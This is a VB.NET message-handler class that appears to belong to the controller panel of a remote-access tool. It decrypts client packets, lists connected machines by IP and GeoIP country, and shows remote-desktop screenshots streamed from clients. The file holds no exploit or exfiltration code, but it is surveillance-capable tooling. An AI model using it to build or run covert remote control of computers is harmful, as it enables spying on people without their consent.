Public Class Messages

    Public Shared F As Form1
    Private Shared Gio As New GeoIP()
    Delegate Sub _Read(ByVal CurrentClient As Client, ByVal Data() As Byte)

    Public Shared Sub Read(ByVal CurrentClient As Client, ByVal Data() As Byte)
        Try
            Dim Packer As New Pack
            Dim itm As Object() = Packer.Deserialize(AES_Decryptor(Data))

            Select Case itm(0)

                Case PacketHeader.identification
                    If F.LV1.InvokeRequired Then
                        F.LV1.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
                        Exit Sub
                    Else
                        CurrentClient.LV = New ListViewItem
                        CurrentClient.LV.Tag = CurrentClient
                        CurrentClient.LV.Text = String.Concat(CurrentClient.IP.Split(":")(0), ":", CurrentClient.ClientSocket.LocalEndPoint.ToString.Split(":")(1))
                        CurrentClient.LV.SubItems.Add(Gio.LookupCountryName(CurrentClient.IP.Split(":")(0)))
                        For i As Integer = 1 To itm.Length - 1
                            CurrentClient.LV.SubItems.Add(itm(i))
                        Next
                        CurrentClient.LV.SubItems.Add(0)
                        F.LV1.Items.Insert(0, CurrentClient.LV)
                        ClinetLog(CurrentClient, "Connected", Color.Green)
                        Settings.Online.Add(CurrentClient)
                        CurrentClient.ID = CurrentClient.LV.SubItems(F._ID.Index).Text
                    End If
                    Exit Select

                Case PacketHeader.RemoteDesktopOpen
                    If F.InvokeRequired Then
                        F.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
                        Exit Sub
                    Else
                        If CurrentClient.LV.ForeColor = Color.Red Then
                            CurrentClient.LV.ForeColor = Color.Empty
                        End If
                        Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + CurrentClient.ID)
                        If RD Is Nothing Then
                            RD = New RemoteDesktop With {
                            .F = F,
                            .C = CurrentClient,
                            .Name = "RD" + CurrentClient.ID,
                            .Text = " Remote Desktop " + CurrentClient.IP.Split(":")(0)
                        }
                            RD.Show()
                        End If
                    End If
                    Exit Select

                Case PacketHeader.RemoteDesktopSend
                    If F.InvokeRequired Then
                        F.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
                        Exit Sub
                    Else
                        Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + CurrentClient.ID)
                        If RD IsNot Nothing Then
                            RD.Text = " Remote Desktop " + CurrentClient.IP.Split(":")(0) + " [" + _Size(itm(1).LongLength) + "]"
                            Using MS As IO.MemoryStream = New IO.MemoryStream(DirectCast(itm(1), Byte()))
                                RD.PictureBox1.Image = Image.FromStream(MS)
                            End Using
                            If RD.Button1.Text = "Capturing..." AndAlso RD.isOK = True Then
                                Dim ClientReq As New Outcoming_Requests(CurrentClient, CByte(PacketHeader.RemoteDesktopSend), RD.Width, RD.Height)
                                Pending.Req_Out.Add(ClientReq)
                            End If
                        End If
                    End If
                    Exit Select

                Case PacketHeader.ErrorMassages
                    If F.LV1.InvokeRequired Then
                        F.LV1.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
                        Exit Sub
                    Else
                        If CurrentClient.LV.ForeColor = Color.Red Then
                            CurrentClient.LV.ForeColor = Color.Empty
                        End If
                        ClinetLog(CurrentClient, itm(1), Color.Black)
                    End If
                    Exit Select

                Case PacketHeader.MsgReceived
                    If F.LV1.InvokeRequired Then
                        F.LV1.BeginInvoke(New _Read(AddressOf Read), New Object() {CurrentClient, Data})
                        Exit Sub
                    Else
                        If CurrentClient.LV.ForeColor = Color.Red Then
                            CurrentClient.LV.ForeColor = Color.Empty
                        End If
                    End If
                    Exit Select


                Case PacketHeader.Ping
                    Debug.WriteLine("Client just pinged me!")
                    Exit Select

            End Select
        Catch ex As Exception
            Debug.WriteLine("Messages " + ex.Message)
            ClinetLog(Nothing, ex.Message, Color.Red)
        End Try
    End Sub

    Delegate Sub _ClinetLog(ByVal CL As Client, ByVal Msg As String, ByVal Color As Color)
    Public Shared Sub ClinetLog(ByVal CL As Client, ByVal Msg As String, ByVal Color As Color)
        If F.InvokeRequired Then : F.BeginInvoke(New _ClinetLog(AddressOf ClinetLog), New Object() {CL, Msg, Color}) : Exit Sub : Else
            If CL IsNot Nothing Then
                Dim lvi As ListViewItem = New ListViewItem()
                lvi.Text = String.Format("{0} -> {1} -> {2}", DateTime.Now.ToShortTimeString, CL.IP.Split(":")(0) + ":" + CL.ClientSocket.LocalEndPoint.ToString.Split(":")(1), Msg)
                lvi.ForeColor = Color
                F.LV2.Items.Insert(0, lvi)
                F.LV2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Else
                Dim lvi As ListViewItem = New ListViewItem()
                lvi.Text = String.Format("{0} -> {1}", DateTime.Now.ToLongTimeString, Msg)
                lvi.ForeColor = Color
                F.LV2.Items.Insert(0, lvi)
                F.LV2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            End If
        End If
    End Sub

End Class
